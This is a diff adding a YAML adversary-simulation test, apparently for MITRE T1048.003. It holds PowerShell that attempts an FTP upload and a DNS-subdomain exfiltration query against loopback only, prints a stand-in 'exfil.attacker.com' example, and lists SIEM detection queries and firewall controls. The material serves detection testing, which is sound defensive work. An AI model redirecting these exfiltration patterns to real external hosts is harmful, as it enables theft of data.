@@ -1,0 +1,97 @@
+id: T1048.003_exfiltration_over_alternative_protocol_unencrypted
+name: "Exfiltration Over Alternative Protocol — Exfiltration Over Unencrypted Non-C2 Protocol"
+mitre_technique: "T1048.003"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate data in plaintext over protocols such as FTP, HTTP,
+  DNS, SMTP, or raw TCP — separate from the C2 channel and without encryption.
+  Unencrypted exfiltration is easier to detect via network monitoring and DLP
+  but may be used when speed is prioritised over stealth or when the adversary
+  believes network monitoring is absent. FTP and DNS are particularly common
+  legacy channels. DNS exfiltration encodes data in subdomain labels and is
+  difficult to block without DNS filtering.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1048/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1048.003 — Unencrypted Non-C2 Exfiltration simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate FTP exfiltration to loopback"
+    command: |
+      $payload = "$env:TEMP\PAS_T1048_003_payload.txt"
+      "PAS-T1048.003-FTP-EXFIL-$(Get-Date -Format o)" | Set-Content $payload
+
+      Write-Host "[PAS] FTP exfiltration pattern (loopback):"
+      # FTP connection to loopback — generates network event
+      try {
+          $ftp = [System.Net.WebRequest]::Create("ftp://127.0.0.1/PAS_exfil.txt")
+          $ftp.Method    = [System.Net.WebRequestMethods+Ftp]::UploadFile
+          $ftp.Credentials = New-Object System.Net.NetworkCredential("anonymous","pas@test.com")
+          $ftp.Timeout   = 500
+          $content = [IO.File]::ReadAllBytes($payload)
+          $ftp.ContentLength = $content.Length
+          $s = $ftp.GetRequestStream()
+          $s.Write($content, 0, $content.Length)
+          $s.Close()
+          $ftp.GetResponse() | Out-Null
+          Write-Host "[PAS] FTP upload to 127.0.0.1:21 completed"
+      } catch {
+          Write-Host "[PAS] FTP connection to loopback attempted (no FTP server — expected)"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate DNS exfiltration — data encoded in subdomain queries"
+    command: |
+      Write-Host "[PAS] DNS exfiltration pattern:"
+      Write-Host "[PAS] Technique: encode data as DNS subdomain labels"
+      Write-Host "[PAS] Example: <base32_chunk>.exfil.attacker.com"
+
+      # Encode data as DNS query subdomains — generates DNS telemetry
+      $data   = "PAS-T1048.003-DNS-EXFIL"
+      $chunks = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)) -replace '=','' -replace '\+','a' -replace '/','b'
+      $chunk  = $chunks.Substring(0, [Math]::Min(60, $chunks.Length))
+      $domain = "$chunk.exfil.127.0.0.1.nip.io"
+      Write-Host "[PAS] DNS exfil query: $domain"
+      try { [System.Net.Dns]::GetHostAddresses($domain) | Out-Null } catch {}
+      Write-Host "[PAS] DNS query generated — resolver would forward subdomain to attacker NS"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — FTP connection to port 21 from endpoint, unusually long DNS query subdomains (>50 chars)"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove exfil payload"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1048_003_payload.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Unencrypted exfil payload removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1048.003 cleanup complete"
+
+analyst_checklist:
+  - "Network event: FTP (port 21) outbound from endpoint — almost never legitimate from workstations"
+  - "DNS event: query with subdomain label >50 chars — DNS exfiltration signature"
+  - "Sentinel: DeviceNetworkEvents | where RemotePort == 21 and ActionType == 'ConnectionSuccess'"
+  - "Sentinel: DeviceEvents | where ActionType == 'DnsQuery' and AdditionalFields contains 'QueryName' | where strlen(QueryName) > 100"
+  - "MDE alert: 'FTP exfiltration' or 'DNS tunnelling detected'"
+  - "CONTROL CHECK: Block outbound FTP (port 21) at firewall — no legitimate user workstation needs it"
+  - "CONTROL CHECK: DNS filtering with query length monitoring — flag queries with subdomains >50 chars"
